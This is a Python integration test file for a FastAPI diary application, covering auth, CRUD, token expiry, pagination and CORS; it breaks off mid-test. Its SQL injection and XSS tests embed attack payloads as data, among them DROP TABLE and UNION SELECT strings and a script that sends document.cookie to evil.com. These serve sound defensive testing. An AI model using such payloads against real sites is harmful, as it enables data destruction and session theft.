"""
Integration tests for full user journey flows.

These tests verify that the entire system works together correctly
from end to end.
"""
import pytest
from fastapi.testclient import TestClient
from unittest.mock import patch, MagicMock
from sqlmodel import Session


class TestUserJourney:
    """Integration tests for complete user workflows."""

    def test_full_user_journey(self, client: TestClient):
        """
        Test 5.1: Complete user journey from signup to logout.

        Given: A new user wants to use the application
        When: User goes through the complete flow
        Then:
          - User can sign up successfully
          - User can log in and receive a token
          - User can create a diary entry
          - User can retrieve their diary entries
          - User can update a diary entry
          - User can delete a diary entry
          - All operations work seamlessly together
        """
        # Step 1: Signup
        signup_data = {
            "email": "journey@example.com",
            "username": "journeyuser",
            "password": "SecureJourney123!",
        }

        signup_response = client.post("/auth/signup", json=signup_data)
        assert signup_response.status_code == 201
        user_data = signup_response.json()
        assert user_data["email"] == signup_data["email"]
        user_id = user_data["id"]

        # Step 2: Login
        login_data = {
            "email": signup_data["email"],
            "password": signup_data["password"],
        }

        login_response = client.post("/auth/login", json=login_data)
        assert login_response.status_code == 200
        token_data = login_response.json()
        assert "access_token" in token_data
        token = token_data["access_token"]

        # Step 3: Create diary entry
        diary_data = {
            "content": "오늘은 통합 테스트를 작성했다. TDD는 정말 재미있다!",
            "title": "통합 테스트 작성",
            "images": ["https://example.com/test-image.jpg"],
            "location": {
                "latitude": 37.5665,
                "longitude": 126.9780,
                "address": "서울특별시 중구",
            },
        }

        create_response = client.post(
            "/diary",
            json=diary_data,
            headers={"Authorization": f"Bearer {token}"},
        )
        assert create_response.status_code == 201
        created_diary = create_response.json()
        assert created_diary["content"] == diary_data["content"]
        assert created_diary["title"] == diary_data["title"]
        assert created_diary["user_id"] == user_id
        diary_id = created_diary["id"]

        # Step 4: Retrieve diary entries (list)
        list_response = client.get(
            "/diary", headers={"Authorization": f"Bearer {token}"}
        )
        assert list_response.status_code == 200
        diaries = list_response.json()
        assert len(diaries) >= 1
        assert any(d["id"] == diary_id for d in diaries)

        # Step 5: Retrieve specific diary entry (detail)
        detail_response = client.get(
            f"/diary/{diary_id}", headers={"Authorization": f"Bearer {token}"}
        )
        assert detail_response.status_code == 200
        diary_detail = detail_response.json()
        assert diary_detail["id"] == diary_id
        assert diary_detail["content"] == diary_data["content"]

        # Step 6: Update diary entry
        update_data = {
            "content": "통합 테스트를 수정했다. 모든 테스트가 통과한다!",
            "title": "통합 테스트 수정",
        }

        update_response = client.put(
            f"/diary/{diary_id}",
            json=update_data,
            headers={"Authorization": f"Bearer {token}"},
        )
        assert update_response.status_code == 200
        updated_diary = update_response.json()
        assert updated_diary["content"] == update_data["content"]
        assert updated_diary["title"] == update_data["title"]

        # Step 7: Delete diary entry
        delete_response = client.delete(
            f"/diary/{diary_id}", headers={"Authorization": f"Bearer {token}"}
        )
        assert delete_response.status_code == 204

        # Verify deletion - diary should not be found
        verify_response = client.get(
            f"/diary/{diary_id}", headers={"Authorization": f"Bearer {token}"}
        )
        assert verify_response.status_code == 404

        # Step 8: Verify list is now empty (or at least doesn't contain deleted diary)
        final_list_response = client.get(
            "/diary", headers={"Authorization": f"Bearer {token}"}
        )
        assert final_list_response.status_code == 200
        final_diaries = final_list_response.json()
        assert not any(d["id"] == diary_id for d in final_diaries)

    def test_network_failure_handling(self, client: TestClient, session: Session):
        """
        Test 5.2: API should handle database failures gracefully.

        Given: A logged-in user wants to create a diary entry
        When: A database error occurs during the operation
        Then:
          - Response status is 500 Internal Server Error
          - Error response is properly formatted
          - The system does not crash
          - Other requests can still be processed after the error
        """
        from src.main import app
        from src.database import get_session

        # Setup: Create and login a user first
        signup_data = {
            "email": "dbfailure@example.com",
            "username": "dbfailureuser",
            "password": "SecurePassword123!",
        }

        signup_response = client.post("/auth/signup", json=signup_data)
        assert signup_response.status_code == 201

        login_data = {
            "email": signup_data["email"],
            "password": signup_data["password"],
        }

        login_response = client.post("/auth/login", json=login_data)
        assert login_response.status_code == 200
        token = login_response.json()["access_token"]

        # Save the original session override
        original_override = app.dependency_overrides.get(get_session)

        # Create a mock session that will fail on commit
        def get_failing_session():
            mock_session = MagicMock(spec=Session)
            # Make the mock session behave like a real session for most operations
            # but fail on commit
            mock_session.commit.side_effect = Exception("Database connection lost")

            # Allow the mock to be used in context manager
            mock_session.__enter__ = MagicMock(return_value=mock_session)
            mock_session.__exit__ = MagicMock(return_value=False)

            return mock_session

        # Override the get_session dependency to return our failing session
        app.dependency_overrides[get_session] = get_failing_session

        try:
            diary_data = {
                "content": "This should fail due to database error",
                "title": "Test Database Failure",
            }

            # Attempt to create diary - should fail with 500
            create_response = client.post(
                "/diary",
                json=diary_data,
                headers={"Authorization": f"Bearer {token}"},
            )

            # Verify error response
            assert create_response.status_code == 500
            error_data = create_response.json()
            assert "detail" in error_data

        finally:
            # Restore the original session override (test session)
            if original_override:
                app.dependency_overrides[get_session] = original_override

        # Verify system is still functional after the error
        # This should succeed with the restored test session
        recovery_data = {
            "content": "System recovered from database error",
            "title": "Recovery Test",
        }

        recovery_response = client.post(
            "/diary",
            json=recovery_data,
            headers={"Authorization": f"Bearer {token}"},
        )

        assert recovery_response.status_code == 201
        assert recovery_response.json()["content"] == recovery_data["content"]

    def test_token_expiration_flow(self, client: TestClient):
        """
        Test 5.3: Complete token expiration and renewal flow.

        Given: A user has logged in and received a valid token
        When: The token expires and user tries to use it
        Then:
          - API returns 401 Unauthorized for expired token
          - User can log in again to get a new token
          - New token works for authenticated requests
          - Full flow: login → use token → expire → fail → re-login → succeed
        """
        from datetime import timedelta
        from src.auth.utils import create_access_token

        # Step 1: Create user and login
        signup_data = {
            "email": "tokenexp@example.com",
            "username": "tokenexpuser",
            "password": "TokenExp123!",
        }

        signup_response = client.post("/auth/signup", json=signup_data)
        assert signup_response.status_code == 201
        user_id = signup_response.json()["id"]

        login_data = {
            "email": signup_data["email"],
            "password": signup_data["password"],
        }

        login_response = client.post("/auth/login", json=login_data)
        assert login_response.status_code == 200
        valid_token = login_response.json()["access_token"]

        # Step 2: Use valid token to create a diary entry (should succeed)
        diary_data = {
            "content": "Test with valid token",
            "title": "Valid Token Test",
        }

        create_response = client.post(
            "/diary",
            json=diary_data,
            headers={"Authorization": f"Bearer {valid_token}"},
        )
        assert create_response.status_code == 201

        # Step 3: Create an expired token (negative expiration time)
        expired_token = create_access_token(
            data={"sub": str(user_id)},
            expires_delta=timedelta(seconds=-1)  # Already expired
        )

        # Step 4: Try to use expired token (should fail with 401)
        expired_diary_data = {
            "content": "This should fail with expired token",
            "title": "Expired Token Test",
        }

        expired_response = client.post(
            "/diary",
            json=expired_diary_data,
            headers={"Authorization": f"Bearer {expired_token}"},
        )
        assert expired_response.status_code == 401
        error_data = expired_response.json()
        assert "detail" in error_data

        # Step 5: Verify that existing diary is still accessible with valid token
        list_response = client.get(
            "/diary",
            headers={"Authorization": f"Bearer {valid_token}"},
        )
        assert list_response.status_code == 200
        diaries = list_response.json()
        assert len(diaries) >= 1

        # Step 6: Re-login to get a new token (token renewal flow)
        relogin_response = client.post("/auth/login", json=login_data)
        assert relogin_response.status_code == 200
        new_token = relogin_response.json()["access_token"]
        # Note: Tokens might be identical if created in the same second (JWT exp is in seconds)
        # What matters is that we can get a new valid token after re-login

        # Step 7: Use new token successfully
        new_diary_data = {
            "content": "Created with renewed token after expiration",
            "title": "Renewed Token Test",
        }

        new_diary_response = client.post(
            "/diary",
            json=new_diary_data,
            headers={"Authorization": f"Bearer {new_token}"},
        )
        assert new_diary_response.status_code == 201
        assert new_diary_response.json()["content"] == new_diary_data["content"]

    def test_invalid_input_handling(self, client: TestClient, create_and_login_user):
        """
        Test 5.4: API should reject invalid inputs with appropriate error messages.

        Given: A user attempts to use the API with invalid inputs
        When: Various types of invalid data are submitted
        Then:
          - API returns 4xx error codes (400, 422)
          - Error messages are clear and informative
          - System remains stable after invalid inputs
          - Valid requests still work after invalid ones
        """
        # Get authenticated user
        auth_data = create_and_login_user(
            email="invalidtest@example.com",
            username="invalidtestuser",
            password="ValidPass123!"
        )
        token = auth_data["access_token"]

        # Test 1: Empty content in diary creation (should fail)
        empty_content_data = {
            "content": "",  # Empty content
            "title": "Empty Content Test",
        }

        empty_response = client.post(
            "/diary",
            json=empty_content_data,
            headers={"Authorization": f"Bearer {token}"},
        )
        assert empty_response.status_code in [400, 422]  # Validation error
        error_data = empty_response.json()
        assert "detail" in error_data

        # Test 2: Missing required field (content)
        missing_field_data = {
            "title": "Missing Content Test",
            # content is missing
        }

        missing_response = client.post(
            "/diary",
            json=missing_field_data,
            headers={"Authorization": f"Bearer {token}"},
        )
        assert missing_response.status_code == 422  # Pydantic validation error
        error_data = missing_response.json()
        assert "detail" in error_data

        # Test 3: Extremely long content (stress test)
        very_long_content = "A" * 100000  # 100k characters
        long_content_data = {
            "content": very_long_content,
            "title": "Long Content Test",
        }

        long_response = client.post(
            "/diary",
            json=long_content_data,
            headers={"Authorization": f"Bearer {token}"},
        )
        # This might succeed or fail depending on DB constraints
        # Just verify we get a response
        assert long_response.status_code in [201, 400, 422, 413, 500]

        # Test 4: Invalid pagination parameters (negative values)
        invalid_pagination_response = client.get(
            "/diary?skip=-1&limit=-10",
            headers={"Authorization": f"Bearer {token}"},
        )
        # Should either reject or normalize negative values
        assert invalid_pagination_response.status_code in [200, 400, 422]

        # Test 5: Excessively large pagination limit
        large_limit_response = client.get(
            "/diary?limit=999999",
            headers={"Authorization": f"Bearer {token}"},
        )
        # Should work but might be capped
        assert large_limit_response.status_code == 200

        # Test 6: Invalid data types (string where number expected)
        invalid_type_response = client.get(
            "/diary?skip=abc&limit=xyz",
            headers={"Authorization": f"Bearer {token}"},
        )
        assert invalid_type_response.status_code == 422  # Type validation error

        # Test 7: Verify system is still functional after all invalid inputs
        # Create a valid diary entry
        valid_data = {
            "content": "System is still working after invalid inputs",
            "title": "Recovery Test",
        }

        recovery_response = client.post(
            "/diary",
            json=valid_data,
            headers={"Authorization": f"Bearer {token}"},
        )
        assert recovery_response.status_code == 201
        assert recovery_response.json()["content"] == valid_data["content"]

        # Test 8: Login with empty credentials (should fail gracefully)
        empty_login = client.post("/auth/login", json={"email": "", "password": ""})
        assert empty_login.status_code in [400, 422]

        # Test 9: Signup with invalid email format (already tested in Phase 1.3, verify integration)
        invalid_email_signup = client.post(
            "/auth/signup",
            json={
                "email": "not-an-email",
                "username": "testuser",
                "password": "ValidPass123!",
            },
        )
        assert invalid_email_signup.status_code in [400, 422]
        error_data = invalid_email_signup.json()
        assert "detail" in error_data

    def test_sql_injection_prevention(self, client: TestClient, create_and_login_user):
        """
        Test 5.5: API should prevent SQL injection attacks.

        Given: An attacker tries to exploit SQL injection vulnerabilities
        When: Various SQL injection payloads are submitted through API endpoints
        Then:
          - All malicious inputs are safely handled
          - No SQL injection can occur due to parameterized queries
          - System remains stable and secure
          - No data is exposed or manipulated
          - Error responses do not leak database information
        """
        # Setup: Create test user and diary entries
        auth_data = create_and_login_user(
            email="sqlinjection@example.com",
            username="sqlinjectionuser",
            password="SqlTest123!"
        )
        token = auth_data["access_token"]

        # Create a legitimate diary entry for comparison
        legitimate_diary = {
            "content": "This is a normal diary entry",
            "title": "Normal Diary",
        }
        create_response = client.post(
            "/diary",
            json=legitimate_diary,
            headers={"Authorization": f"Bearer {token}"},
        )
        assert create_response.status_code == 201
        legitimate_diary_id = create_response.json()["id"]

        # Test 1: SQL injection in email field during login
        # Attempt: ' OR '1'='1' -- (classic SQL injection)
        sql_injection_login = {
            "email": "' OR '1'='1' --",
            "password": "anything",
        }
        login_response = client.post("/auth/login", json=sql_injection_login)
        # Should fail authentication (not bypass it)
        # Can be 401 (invalid credentials) or 422 (validation error for invalid email format)
        assert login_response.status_code in [401, 422]
        error_data = login_response.json()
        # Verify error message doesn't leak database info
        assert "detail" in error_data
        error_detail = str(error_data.get("detail", ""))
        assert "SQL" not in error_detail.upper()
        assert "DATABASE" not in error_detail.upper()

        # Test 2: SQL injection in signup username
        # Attempt: admin'; DROP TABLE users; --
        sql_injection_signup = {
            "email": "hacker@example.com",
            "username": "admin'; DROP TABLE users; --",
            "password": "HackerPass123!",
        }
        signup_response = client.post("/auth/signup", json=sql_injection_signup)
        # Should either succeed (storing the malicious string as-is) or fail validation
        # But NEVER execute the SQL command
        assert signup_response.status_code in [201, 400, 422]

        # Verify users table still exists by making a valid request
        verify_login = client.post(
            "/auth/login",
            json={
                "email": "sqlinjection@example.com",
                "password": "SqlTest123!",
            },
        )
        assert verify_login.status_code == 200  # Should still work

        # Test 3: SQL injection in diary content
        # Attempt: '; DELETE FROM diaries WHERE '1'='1
        sql_injection_diary = {
            "content": "'; DELETE FROM diaries WHERE '1'='1",
            "title": "SQL Injection Test",
        }
        diary_response = client.post(
            "/diary",
            json=sql_injection_diary,
            headers={"Authorization": f"Bearer {token}"},
        )
        # Should store the content as plain text, not execute it
        assert diary_response.status_code == 201

        # Verify legitimate diary still exists (wasn't deleted by injection)
        verify_diary = client.get(
            f"/diary/{legitimate_diary_id}",
            headers={"Authorization": f"Bearer {token}"},
        )
        assert verify_diary.status_code == 200
        assert verify_diary.json()["content"] == legitimate_diary["content"]

        # Test 4: SQL injection in diary title
        # Attempt: ' UNION SELECT * FROM users --
        union_injection_diary = {
            "content": "Testing UNION injection",
            "title": "' UNION SELECT * FROM users --",
        }
        union_response = client.post(
            "/diary",
            json=union_injection_diary,
            headers={"Authorization": f"Bearer {token}"},
        )
        assert union_response.status_code == 201
        # Verify the malicious title is stored as plain text
        created_diary = union_response.json()
        assert created_diary["title"] == union_injection_diary["title"]

        # Test 5: SQL injection through URL parameters
        # Attempt to inject through diary_id in GET request
        malicious_id = "1' OR '1'='1"
        malicious_get = client.get(
            f"/diary/{malicious_id}",
            headers={"Authorization": f"Bearer {token}"},
        )
        # Should return 422 (validation error) or 404 (not found), not 200
        assert malicious_get.status_code in [404, 422]

        # Test 6: Boolean-based blind SQL injection
        # Attempt: 1' AND '1'='1
        blind_injection = {
            "email": "test@example.com' AND '1'='1 --",
            "password": "password",
        }
        blind_response = client.post("/auth/login", json=blind_injection)
        # Should fail with 401 or 422, not succeed
        assert blind_response.status_code in [401, 422]

        # Test 7: Time-based SQL injection
        # Attempt: '; WAITFOR DELAY '00:00:05'--
        time_injection_diary = {
            "content": "'; WAITFOR DELAY '00:00:05'--",
            "title": "Time Injection Test",
        }
        # This should complete quickly (not wait 5 seconds)
        import time
        start_time = time.time()
        time_response = client.post(
            "/diary",
            json=time_injection_diary,
            headers={"Authorization": f"Bearer {token}"},
        )
        elapsed_time = time.time() - start_time

        assert time_response.status_code == 201
        # Request should complete in under 2 seconds (not execute WAITFOR)
        assert elapsed_time < 2.0

        # Test 8: Verify all legitimate data is still intact
        final_list = client.get(
            "/diary",
            headers={"Authorization": f"Bearer {token}"},
        )
        assert final_list.status_code == 200
        diaries = final_list.json()
        # Should have at least the legitimate diary we created
        assert len(diaries) >= 1
        # Verify legitimate diary content is unchanged
        legitimate_exists = any(
            d["id"] == legitimate_diary_id and d["content"] == legitimate_diary["content"]
            for d in diaries
        )
        assert legitimate_exists

    def test_xss_prevention(self, client: TestClient, create_and_login_user):
        """
        Test 5.6: API should prevent Cross-Site Scripting (XSS) attacks.

        Given: An attacker tries to inject malicious scripts through user inputs
        When: Various XSS payloads are submitted through API endpoints
        Then:
          - All malicious scripts are safely stored as plain text
          - JSON responses are properly encoded
          - Content-Type headers are correctly set
          - No script execution can occur when data is retrieved
          - System remains stable and secure
        """
        # Setup: Create test user
        auth_data = create_and_login_user(
            email="xsstest@example.com",
            username="xsstestuser",
            password="XssTest123!"
        )
        token = auth_data["access_token"]

        # Test 1: Basic XSS - Script tag in diary content
        xss_script_diary = {
            "content": "<script>alert('XSS Attack!')</script>",
            "title": "XSS Script Test",
        }
        script_response = client.post(
            "/diary",
            json=xss_script_diary,
            headers={"Authorization": f"Bearer {token}"},
        )
        assert script_response.status_code == 201
        created_diary = script_response.json()
        # Verify content is stored as-is (plain text, not executed)
        assert created_diary["content"] == xss_script_diary["content"]
        diary_id_1 = created_diary["id"]

        # Test 2: Image tag with onerror event
        xss_img_diary = {
            "content": "<img src=x onerror=alert('XSS')>",
            "title": "XSS Image Test",
        }
        img_response = client.post(
            "/diary",
            json=xss_img_diary,
            headers={"Authorization": f"Bearer {token}"},
        )
        assert img_response.status_code == 201
        assert img_response.json()["content"] == xss_img_diary["content"]

        # Test 3: XSS in title field
        xss_title_diary = {
            "content": "Normal content",
            "title": "<svg onload=alert('XSS')>",
        }
        title_response = client.post(
            "/diary",
            json=xss_title_diary,
            headers={"Authorization": f"Bearer {token}"},
        )
        assert title_response.status_code == 201
        assert title_response.json()["title"] == xss_title_diary["title"]

        # Test 4: XSS with HTML entities
        xss_entities_diary = {
            "content": "&lt;script&gt;alert('XSS')&lt;/script&gt;",
            "title": "XSS Entities Test",
        }
        entities_response = client.post(
            "/diary",
            json=xss_entities_diary,
            headers={"Authorization": f"Bearer {token}"},
        )
        assert entities_response.status_code == 201
        assert entities_response.json()["content"] == xss_entities_diary["content"]

        # Test 5: XSS with JavaScript protocol
        xss_js_protocol_diary = {
            "content": "Click here: <a href='javascript:alert(\"XSS\")'>Link</a>",
            "title": "JavaScript Protocol Test",
        }
        js_protocol_response = client.post(
            "/diary",
            json=xss_js_protocol_diary,
            headers={"Authorization": f"Bearer {token}"},
        )
        assert js_protocol_response.status_code == 201
        assert js_protocol_response.json()["content"] == xss_js_protocol_diary["content"]

        # Test 6: XSS in username during signup
        xss_signup = {
            "email": "xssuser@example.com",
            "username": "<script>alert('XSS')</script>",
            "password": "XssPass123!",
        }
        signup_response = client.post("/auth/signup", json=xss_signup)
        # Should succeed and store username as plain text
        assert signup_response.status_code == 201
        user_data = signup_response.json()
        assert user_data["username"] == xss_signup["username"]

        # Test 7: Complex XSS payload
        complex_xss_diary = {
            "content": """
                <div>
                    <script>fetch('http://evil.com?cookie='+document.cookie)</script>
                    <iframe src="javascript:alert('XSS')"></iframe>
                    <img src=x onerror="eval(atob('YWxlcnQoJ1hTUycp'))">
                </div>
            """,
            "title": "Complex XSS Test",
        }
        complex_response = client.post(
            "/diary",
            json=complex_xss_diary,
            headers={"Authorization": f"Bearer {token}"},
        )
        assert complex_response.status_code == 201
        assert complex_response.json()["content"] == complex_xss_diary["content"]

        # Test 8: Verify Content-Type headers are correct
        # This prevents browser from interpreting JSON as HTML
        list_response = client.get(
            "/diary",
            headers={"Authorization": f"Bearer {token}"},
        )
        assert list_response.status_code == 200
        # FastAPI should set Content-Type to application/json
        assert "application/json" in list_response.headers.get("content-type", "").lower()

        # Test 9: Retrieve diary with XSS content
        detail_response = client.get(
            f"/diary/{diary_id_1}",
            headers={"Authorization": f"Bearer {token}"},
        )
        assert detail_response.status_code == 200
        detail_data = detail_response.json()
        # Verify XSS content is returned as-is (JSON encoded)
        assert detail_data["content"] == xss_script_diary["content"]
        # Verify it's JSON, not HTML
        assert "application/json" in detail_response.headers.get("content-type", "").lower()

        # Test 10: XSS in update operation
        xss_update = {
            "content": "<body onload=alert('XSS')>Updated content</body>",
            "title": "<marquee>XSS Update</marquee>",
        }
        update_response = client.put(
            f"/diary/{diary_id_1}",
            json=xss_update,
            headers={"Authorization": f"Bearer {token}"},
        )
        assert update_response.status_code == 200
        updated_data = update_response.json()
        assert updated_data["content"] == xss_update["content"]
        assert updated_data["title"] == xss_update["title"]

        # Test 11: Verify all XSS payloads are stored safely
        final_list = client.get(
            "/diary",
            headers={"Authorization": f"Bearer {token}"},
        )
        assert final_list.status_code == 200
        diaries = final_list.json()
        # Should have multiple diaries with XSS payloads stored as plain text
        assert len(diaries) >= 5

        # Test 12: XSS with special characters and quotes
        special_chars_diary = {
            "content": """<script>alert("XSS with 'quotes' and \"double quotes\"");</script>""",
            "title": "Special Characters Test",
        }
        special_response = client.post(
            "/diary",
            json=special_chars_diary,
            headers={"Authorization": f"Bearer {token}"},
        )
        assert special_response.status_code == 201
        # Verify JSON encoding handles quotes correctly
        special_data = special_response.json()
        assert special_data["content"] == special_chars_diary["content"]

    def test_cors_policy(self, client: TestClient, create_and_login_user):
        """
        Test 5.7: API should enforce proper CORS policy.

        Given: The API has CORS middleware configured
        When: Requests are made from different origins
        Then:
          - Allowed origins receive proper CORS headers
          - Preflight requests (OPTIONS) are handled correctly
          - Access-Control headers are correctly set
          - Credentials are allowed for permitted origins
          - CORS policy protects against unauthorized cross-origin access
        """
        # Setup: Create test user
        auth_data = create_and_login_user(
            email="corstest@example.com",
            username="corstestuser",
            password="CorsTest123!"
        )
        token = auth_data["access_token"]

        # Test 1: OPTIONS preflight request for diary endpoint
        # This is what browsers send before actual CORS requests
        preflight_response = client.options(
            "/diary",
            headers={
                "Origin": "http://localhost:8081",
                "Access-Control-Request-Method": "POST",
                "Access-Control-Request-Headers": "authorization,content-type",
            },
        )
        # Preflight should return 200 OK with CORS headers
        assert preflight_response.status_code == 200

        # Verify CORS headers are present
        cors_headers = preflight_response.headers
        assert "access-control-allow-origin" in cors_headers
        assert "access-control-allow-credentials" in cors_headers
        assert "access-control-allow-methods" in cors_headers
        assert "access-control-allow-headers" in cors_headers

        # Test 2: Actual request from allowed origin
        diary_data = {
            "content": "Testing CORS policy",
            "title": "CORS Test",
        }
        allowed_origin_response = client.post(
            "/diary",
            json=diary_data,
            headers={
                "Authorization": f"Bearer {token}",
                "Origin": "http://localhost:8081",
            },
        )
        assert allowed_origin_response.status_code == 201

        # Verify CORS headers in actual response
        response_headers = allowed_origin_response.headers
        assert "access-control-allow-origin" in response_headers
        # Should allow the origin
        assert "localhost:8081" in response_headers.get("access-control-allow-origin", "")

        # Test 3: Check credentials are allowed
        assert "access-control-allow-credentials" in response_headers
        assert response_headers.get("access-control-allow-credentials", "").lower() == "true"

        # Test 4: GET request with CORS
        list_response = client.get(
            "/diary",
            headers={
                "Authorization": f"Bearer {token}",
                "Origin": "http://localhost:8081",
            },
        )
        assert list_response.status_code == 200
        list_headers = list_response.headers
        assert "access-control-allow-origin" in list_headers

        # Test 5: Login endpoint with CORS
        login_data = {
            "email": "corstest@example.com",
            "password": "CorsTest123!",
        }
        login_response = client.post(
            "/auth/login",
            json=login_data,
            headers={
                "Origin": "http://localhost:8081",
            },
        )
        assert login_response.status_code == 200
        login_headers = login_response.headers
        assert "access-control-allow-origin" in login_headers

        # Test 6: Root endpoint with CORS
        root_response = client.get(
            "/",
            headers={
                "Origin": "http://localhost:8081",
            },
        )
        assert root_response.status_code == 200
        root_headers = root_response.headers
        assert "access-control-allow-origin" in root_headers

        # Test 7: Preflight for auth endpoint
        auth_preflight = client.options(
            "/auth/login",
            headers={
                "Origin": "http://localhost:8081",
                "Access-Control-Request-Method": "POST",
                "Access-Control-Request-Headers": "content-type",
            },
        )
        assert auth_preflight.status_code == 200
        auth_preflight_headers = auth_preflight.headers
        assert "access-control-allow-methods" in auth_preflight_headers
        # Should allow POST method
        allowed_methods = auth_preflight_headers.get("access-control-allow-methods", "")
        assert "POST" in allowed_methods

        # Test 8: Verify all HTTP methods are allowed (configured as allow_methods=["*"])
        allowed_methods_str = auth_preflight_headers.get("access-control-allow-methods", "")
        # FastAPI CORS middleware with ["*"] should allow all methods
        # This typically includes GET, POST, PUT, DELETE, OPTIONS, etc.
        common_methods = ["GET", "POST", "PUT", "DELETE", "OPTIONS"]
        for method in common_methods:
            assert method in allowed_methods_str

        # Test 9: Verify headers are allowed (configured as allow_headers=["*"])
        allowed_headers = auth_preflight_headers.get("access-control-allow-headers", "")
        # Should allow common headers
        # Note: With allow_headers=["*"], the middleware typically echoes back requested headers
        assert len(allowed_headers) > 0

        # Test 10: Multiple requests to ensure CORS is consistently applied
        for i in range(3):
            test_response = client.get(
                "/",
                headers={
                    "Origin": "http://localhost:8081",
                },
            )
            assert test_response.status_code == 200
            assert "access-control-allow-origin" in test_response.headers

        # Test 11: CORS with PUT request
        diary_id = allowed_origin_response.json()["id"]
        update_response = client.put(
            f"/diary/{diary_id}",
            json={"content": "Updated with CORS", "title": "Updated CORS Test"},
            headers={
                "Authorization": f"Bearer {token}",
                "Origin": "http://localhost:8081",
            },
        )
        assert update_response.status_code == 200
        assert "access-control-allow-origin" in update_response.headers

        # Test 12: CORS with DELETE request
        delete_response = client.delete(
            f"/diary/{diary_id}",
            headers={
                "Authorization": f"Bearer {token}",
                "Origin": "http://localhost:8081",
            },
        )
        assert delete_response.status_code == 204
        # Even 204 responses should have CORS headers
        assert "access-control-allow-origin" in delete_response.headers

    def test_large_diary_list_pagination(self, client: TestClient, create_and_login_user):
        """
        Test 5.8: API should handle large diary lists with proper pagination.

        Given: A user has many diary entries (50+ entries)
        When: User requests diary list with different pagination parameters
        Then:
          - Pagination works correctly with skip and limit parameters
          - First page returns correct number of entries
          - Middle page returns correct entries
          - Last page returns remaining entries
          - Total count of entries is preserved across pages
          - Entries are ordered consistently (e.g., by creation date desc)
          - Empty pages return empty arrays (not errors)
        """
        # Setup: Create test user
        auth_data = create_and_login_user(
            email="pagination@example.com",
            username="paginationuser",
            password="PageTest123!"
        )
        token = auth_data["access_token"]

        # Create 50 diary entries
        num_diaries = 50
        created_diary_ids = []

        for i in range(num_diaries):
            diary_data = {
                "content": f"일기 내용 #{i+1}: TDD로 개발하는 페이지네이션 테스트",
                "title": f"일기 제목 {i+1}",
            }
            create_response = client.post(
                "/diary",
                json=diary_data,
                headers={"Authorization": f"Bearer {token}"},
            )
            assert create_response.status_code == 201
            created_diary_ids.append(create_response.json()["id"])

        # Test 1: Get all diaries without pagination (default behavior)
        all_response = client.get(
            "/diary",
            headers={"Authorization": f"Bearer {token}"},
        )
        assert all_response.status_code == 200
        all_diaries = all_response.json()
        assert len(all_diaries) == num_diaries

        # Test 2: First page with limit=10
        first_page_response = client.get(
            "/diary?skip=0&limit=10",
            headers={"Authorization": f"Bearer {token}"},
        )
        assert first_page_response.status_code == 200
        first_page = first_page_response.json()
        assert len(first_page) == 10

        # Test 3: Second page with skip=10, limit=10
        second_page_response = client.get(
            "/diary?skip=10&limit=10",
            headers={"Authorization": f"Bearer {token}"},
        )
        assert second_page_response.status_code == 200
        second_page = second_page_response.json()
        assert len(second_page) == 10

        # Verify first and second pages have different entries (no overlap)
        first_page_ids = {d["id"] for d in first_page}
        second_page_ids = {d["id"] for d in second_page}
        assert len(first_page_ids.intersection(second_page_ids)) == 0

        # Test 4: Middle page - skip=20, limit=15
        middle_page_response = client.get(
            "/diary?skip=20&limit=15",
            headers={"Authorization": f"Bearer {token}"},
        )
        assert middle_page_response.status_code == 200
        middle_page = middle_page_response.json()
        assert len(middle_page) == 15

        # Test 5: Last page - skip=45, limit=10 (should return only 5 remaining)
        last_page_response = client.get(
            "/diary?skip=45&limit=10",
            headers={"Authorization": f"Bearer {token}"},
        )
        assert last_page_response.status_code == 200
        last_page = last_page_response.json()
        assert len(last_page) == 5  # Only 5 entries remain

        # Test 6: Beyond last page - skip=100, limit=10 (should return empty array)
        empty_page_response = client.get(
            "/diary?skip=100&limit=10",
            headers={"Authorization": f"Bearer {token}"},
        )
        assert empty_page_response.status_code == 200
        empty_page = empty_page_response.json()
        assert len(empty_page) == 0
        assert isinstance(empty_page, list)

        # Test 7: Large limit (request more than available)
        large_limit_response = client.get(
            "/diary?skip=0&limit=1000",
            headers={"Authorization": f"Bearer {token}"},
        )
        assert large_limit_response.status_code == 200
        large_limit_diaries = large_limit_response.json()
        # Should return all 50 diaries (not fail or return more)
        assert len(large_limit_diaries) == num_diaries

        # Test 8: Small pages - iterate through all with limit=5
        page_size = 5
        collected_ids = set()

        for page_num in range(num_diaries // page_size):
            skip = page_num * page_size
            page_response = client.get(
                f"/diary?skip={skip}&limit={page_size}",
                headers={"Authorization": f"Bearer {token}"},
            )
            assert page_response.status_code == 200
            page_diaries = page_response.json()
            assert len(page_diaries) == page_size

            # Collect IDs
            for diary in page_diaries:
                collected_ids.add(diary["id"])

        # Verify all diaries were collected (no duplicates, no missing)
        assert len(collected_ids) == num_diaries

        # Test 9: Verify ordering is consistent across pages
        # Get first entry from page 1
        page1_first = first_page[0]["id"]

        # Get same page again - should have same first entry
        page1_again_response = client.get(
            "/diary?skip=0&limit=10",
            headers={"Authorization": f"Bearer {token}"},
        )
        page1_again = page1_again_response.json()
        assert page1_again[0]["id"] == page1_first

        # Test 10: skip=0, limit=1 (minimal page)
        single_response = client.get(
            "/diary?skip=0&limit=1",
            headers={"Authorization": f"Bearer {token}"},
        )
        assert single_response.status_code == 200
        single_page = single_response.json()
        assert len(single_page) == 1

        # Test 11: Verify all created diaries are accessible through pagination
        all_paginated_ids = set()
        current_skip = 0
        page_limit = 7  # Use odd number to test edge cases

        while True:
            page_response = client.get(
                f"/diary?skip={current_skip}&limit={page_limit}",
                headers={"Authorization": f"Bearer {token}"},
            )
            assert page_response.status_code == 200
            page_data = page_response.json()

            if len(page_data) == 0:
                break

            for diary in page_data:
                all_paginated_ids.add(diary["id"])

            current_skip += page_limit

        # Should have collected all diary IDs
        assert len(all_paginated_ids) == num_diaries
        # Verify all created IDs are present
        for created_id in created_diary_ids:
            assert created_id in all_paginated_ids

    def test_multiple_images_upload(self, client: TestClient, create_and_login_user):
        """
        Test 5.9: API should handle multiple image uploads correctly.

        Given: A user wants to attach multiple images to diary entries
        When: Various scenarios with multiple images are tested
        Then:
          - Multiple images (10+) can be stored and retrieved
          - Empty image arrays are handled correctly
          - Images can be updated (added/removed)
          - Very long URLs are supported
          - Image data persists correctly across operations
          - Images are returned in the same order they were uploaded
        """
        # Setup: Create test user
        auth_data = create_and_login_user(
            email="imagetest@example.com",
            username="imagetestuser",
            password="ImageTest123!"
        )
        token = auth_data["access_token"]

        # Test 1: Create diary with multiple images (10 images)
        many_images = [
            f"https://example.com/images/photo{i}.jpg"
            for i in range(1, 11)
        ]
        diary_data = {
